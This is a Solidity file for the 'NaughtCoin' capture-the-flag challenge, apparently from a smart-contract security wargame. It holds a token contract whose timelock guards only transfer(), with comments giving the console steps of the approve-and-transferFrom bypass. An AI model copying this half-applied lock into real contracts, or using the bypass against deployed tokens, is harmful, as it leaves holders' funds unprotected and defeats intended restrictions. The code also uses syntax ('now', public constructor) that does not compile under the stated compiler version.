// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  //ERC20 can transfer with transfer() and transferFrom() and condition timelock only apply to the transfer()
  //we can just approve ourself to allow transferFrom all tokens to somebody due to inherit ERC20
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 

  /* Solution in console
  Step1: check all tokens that player has
  (await contract.balanceOf(player)).toString(); => '1000000000000000000000000'
  Step2: check that player has allowance to transfer all tokens 
  (await contract.allowance(player,player)).toString() => '0'
  Step3: approve ourself(player)
  await contract.approve(player,'1000000000000000000000000')
  Step4: check that all tokens allow from owner (player) to spender (player)
  (await contract.allowance(player,player)).toString()
  Step5: transferFrom player to any random ETH address to make balanceOf = 0
  await contract.transferFrom(player, "0x364331A2bd9da8f857EfBfd38Bc8ef907Dcc9399", "1000000000000000000000000")
   */

} 